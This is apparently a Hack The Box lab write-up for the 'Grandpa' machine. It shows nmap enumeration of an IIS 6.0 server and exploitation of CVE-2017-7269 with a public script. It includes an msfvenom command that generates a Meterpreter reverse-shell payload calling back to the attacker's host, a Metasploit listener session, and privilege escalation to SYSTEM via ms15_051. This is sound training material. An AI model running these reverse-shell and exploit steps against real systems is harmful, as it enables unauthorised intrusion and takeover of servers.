---
layout: post
title: Hack the Box - Grandpa
date: 2020-05-24 12:26:22 +0100
description: Grandpa is one of the simpler machines on Hack The Box, however it covers the widely-exploitedCVE-2017-7269. This vulnerability is trivial to exploit and granted immediate access to thousands of IIS servers around the globe when it became public knowledge.
img: grandpa.png
fig-caption: Grandpa
categories: HackTheBox
tags: [Easy, Windows, Retired, CVE]
---
## Overview
Grandpa is one of the simpler machines on Hack The Box, however it covers the widely-exploitedCVE-2017-7269. This vulnerability is trivial to exploit and granted immediate access to thousands of IIS servers around the globe when it became public knowledge.
## Enumeration
After carrying out some nmap scans it was clear this box was very similar to Granny, although the Dav vulnerability that allowed us to upload pages had been fixed.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/grandpa]
└─$ sudo nmap -p- -T4  10.129.59.43 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 12:46 GMT
Nmap scan report for 10.129.59.43
Host is up (0.017s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 88.12 seconds

┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/grandpa]
└─$ sudo nmap -p80 --script vuln  10.129.59.43
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 12:49 GMT
Nmap scan report for 10.129.59.43
Host is up (0.017s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /postinfo.html: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /_vti_bin/shtml.dll: Frontpage file or folder
|_  /_vti_bin/shtml.exe: Frontpage file or folder
| http-frontpage-login: 
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
|       
|     References:
|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

Nmap done: 1 IP address (1 host up) scanned in 152.86 seconds
```
However after enumerating the service version as shown below some googling revealed that it vulnerable to an RCE vulnerability. In an attempt to not use metasploit I found a python script that can exploit this vulnerability [ExplodingCan](https://github.com/danigargu/explodingcan)
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/grandpa]
└─$ sudo nmap -p80 -A  10.129.59.43 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 12:48 GMT
Nmap scan report for 10.129.59.43
Host is up (0.017s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
```
## Foothold
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/granny]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -f raw -e x86/alpha_mixed LHOST=10.10.14.27 LPORT=4422 > shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 770 (iteration=0)
x86/alpha_mixed chosen with final size 770
Payload size: 770 bytes

                                                                                                                                                                                                                                             
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/granny]
└─$ python 41738.py http://10.129.59.43 shellcode                                                                 
[*] Using URL: http://10.129.59.43
[*] Server found: Microsoft-IIS/6.0
[*] Found IIS path size: 18
[*] Default IIS path: C:\Inetpub\wwwroot
[*] WebDAV request: OK
[*] Payload len: 2283
[*] Sending payload...
[*] Socket timeout
[+] The host is maybe vulnerable
```
Having generated the payload and sent it off using the script, as long as there is a metasploit listener it should receive the reverse shell.
```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.27:4422 
[*] Sending stage (175174 bytes) to 10.129.59.43
[*] Meterpreter session 1 opened (10.10.14.27:4422 -> 10.129.59.43:1030) at 2021-03-15 14:17:39 +0000

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```
## Privilege Escalation
Once we receive the shell we have the network service system user, after we enumerate local exploits using the local_exploit_suggester in metasploit we find a successful exploit as shown below
```
msf6 exploit(windows/local/ms15_051_client_copy_image) > exploit

[*] Started reverse TCP handler on 10.10.14.27:4949 
[*] Launching notepad to host the exploit...
[+] Process 1684 launched.
[*] Reflectively injecting the exploit DLL into 1684...
[*] Injecting exploit into 1684...
[*] Exploit injected. Injecting payload into 1684...
[*] Payload injected. Executing exploit...
[*] Sending stage (175174 bytes) to 10.129.59.43
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 2 opened (10.10.14.27:4949 -> 10.129.59.43:1031) at 2021-03-15 14:20:04 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```